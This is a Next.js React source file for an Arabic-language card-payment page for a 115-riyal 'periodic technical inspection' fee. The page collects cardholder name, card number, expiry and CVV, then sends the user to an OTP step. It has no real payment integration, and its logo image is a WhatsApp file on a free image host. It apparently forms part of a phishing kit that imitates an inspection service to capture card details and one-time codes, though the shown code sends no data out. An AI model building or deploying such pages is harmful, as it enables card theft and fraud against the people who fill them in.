"use client";
import { useState } from "react";
import { useRouter } from "next/navigation";

const GREEN = "#1e7344";

export default function PaymentPage() {
  const router = useRouter();
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");

  function formatCardNumber(val: string) {
    const digits = val.replace(/\D/g, "").slice(0, 16);
    return digits.replace(/(.{4})/g, "$1 ").trim();
  }

  function formatExpiry(val: string) {
    const digits = val.replace(/\D/g, "").slice(0, 4);
    if (digits.length >= 3) return digits.slice(0, 2) + " / " + digits.slice(2);
    return digits;
  }

  function getCardType(num: string) {
    const n = num.replace(/\s/g, "");
    if (n.startsWith("4")) return "visa";
    if (n.startsWith("5") || n.startsWith("2")) return "mastercard";
    return null;
  }

  function handleSubmit() {
    if (!cardHolder || !cardNumber || !expiry || !cvv) {
      alert("يرجى تعبئة جميع البيانات");
      return;
    }
    router.push("/otp");
  }

  const cardType = getCardType(cardNumber);
  const displayNumber = cardNumber || "#### #### #### ####";

  return (
    <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", padding: "20px" }}>
      <div style={{ background: "#fff", width: "100%", maxWidth: "420px", borderRadius: "25px", padding: "25px 20px", boxShadow: "0 10px 30px rgba(0,0,0,0.08)", textAlign: "center" }}>

        {/* Header */}
        <div style={{ marginBottom: "20px" }}>
          <h1 style={{ fontSize: "18px", color: "#333", marginBottom: "5px" }}>إتمام عملية الدفع</h1>
          <p style={{ fontSize: "14px", color: GREEN, fontWeight: "bold" }}>بقيمة 115 ريال - خدمة الفحص الفني الدوري</p>
        </div>

        {/* Card Visual */}
        <div style={{
          width: "100%", height: "200px",
          background: "linear-gradient(135deg, #1e7344 0%, #114126 100%)",
          borderRadius: "15px", padding: "20px", marginBottom: "25px",
          color: "white", position: "relative", boxShadow: "0 8px 20px rgba(0,0,0,0.15)",
          direction: "ltr", textAlign: "left", overflow: "hidden"
        }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", height: "40px" }}>
            <div style={{ width: "45px", height: "35px", background: "linear-gradient(135deg, #f0d060 0%, #b88a14 100%)", borderRadius: "6px" }} />
            {cardType === "visa" && (
              <span style={{ fontSize: "22px", fontWeight: "900", fontStyle: "italic", color: "#fff", letterSpacing: "1px" }}>VISA</span>
            )}
            {cardType === "mastercard" && (
              <div style={{ display: "flex" }}>
                <div style={{ width: "28px", height: "28px", borderRadius: "50%", background: "#eb001b", opacity: 0.9 }} />
                <div style={{ width: "28px", height: "28px", borderRadius: "50%", background: "#f79e1b", opacity: 0.9, marginLeft: "-12px" }} />
              </div>
            )}
          </div>
          <div style={{ fontSize: "18px", letterSpacing: "2px", marginTop: "30px", fontFamily: "Courier New, monospace", whiteSpace: "nowrap" }}>
            {displayNumber}
          </div>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-end", marginTop: "20px", direction: "rtl" }}>
            <div style={{ fontSize: "13px", textAlign: "right", maxWidth: "190px", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
              {cardHolder || "اسم حامل البطاقة"}
            </div>
            <div style={{ fontSize: "14px", direction: "ltr" }}>{expiry || "00 / 00"}</div>
          </div>
        </div>

        {/* Payment Logos */}
        <div style={{ display: "flex", justifyContent: "center", marginBottom: "20px" }}>
          <img src="https://i.ibb.co/tpNdmqZz/IMG-20260312-WA0007.jpg" style={{ width: "100%", maxWidth: "280px", height: "auto" }} alt="Payment Methods" />
        </div>

        {/* Form */}
        <div style={{ textAlign: "right", marginBottom: "15px" }}>
          <label style={{ display: "block", fontSize: "13px", fontWeight: "bold", color: "#444", marginBottom: "7px" }}>اسم حامل البطاقة</label>
          <input
            type="text"
            value={cardHolder}
            onChange={e => setCardHolder(e.target.value.replace(/[0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/g, ""))}
            placeholder="الاسم كما هو على البطاقة"
            style={{ width: "100%", padding: "13px", border: "1px solid #e0e0e0", borderRadius: "10px", fontSize: "15px", outline: "none", textAlign: "right", fontFamily: "inherit" }}
          />
        </div>

        <div style={{ textAlign: "right", marginBottom: "15px" }}>
          <label style={{ display: "block", fontSize: "13px", fontWeight: "bold", color: "#444", marginBottom: "7px" }}>رقم البطاقة</label>
          <input
            type="tel"
            value={cardNumber}
            onChange={e => setCardNumber(formatCardNumber(e.target.value))}
            placeholder="1234 5678 9012 3456"
            maxLength={19}
            style={{ width: "100%", padding: "13px", border: "1px solid #e0e0e0", borderRadius: "10px", fontSize: "15px", outline: "none", direction: "ltr", textAlign: "left", fontFamily: "Courier New, monospace" }}
          />
        </div>

        <div style={{ display: "flex", gap: "10px", marginBottom: "20px" }}>
          <div style={{ flex: 1.5, textAlign: "right" }}>
            <label style={{ display: "block", fontSize: "13px", fontWeight: "bold", color: "#444", marginBottom: "7px" }}>تاريخ الانتهاء</label>
            <input
              type="tel"
              value={expiry}
              onChange={e => setExpiry(formatExpiry(e.target.value))}
              placeholder="MM / YY"
              maxLength={7}
              style={{ width: "100%", padding: "13px", border: "1px solid #e0e0e0", borderRadius: "10px", fontSize: "15px", outline: "none", direction: "ltr", textAlign: "left", fontFamily: "inherit" }}
            />
          </div>
          <div style={{ flex: 1, textAlign: "right" }}>
            <label style={{ display: "block", fontSize: "13px", fontWeight: "bold", color: "#444", marginBottom: "7px" }}>رمز (CVV)</label>
            <input
              type="tel"
              value={cvv}
              onChange={e => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
              placeholder="123"
              maxLength={3}
              style={{ width: "100%", padding: "13px", border: "1px solid #e0e0e0", borderRadius: "10px", fontSize: "15px", outline: "none", direction: "ltr", textAlign: "left", fontFamily: "inherit" }}
            />
          </div>
        </div>

        <button
          onClick={handleSubmit}
          style={{ width: "100%", backgroundColor: "#82b199", color: "white", border: "none", borderRadius: "10px", padding: "16px", fontSize: "18px", fontWeight: "bold", cursor: "pointer", transition: "background 0.3s" }}
          onMouseEnter={e => (e.currentTarget.style.backgroundColor = GREEN)}
          onMouseLeave={e => (e.currentTarget.style.backgroundColor = "#82b199")}
        >
          ادفع الآن
        </button>
      </div>
    </div>
  );
}
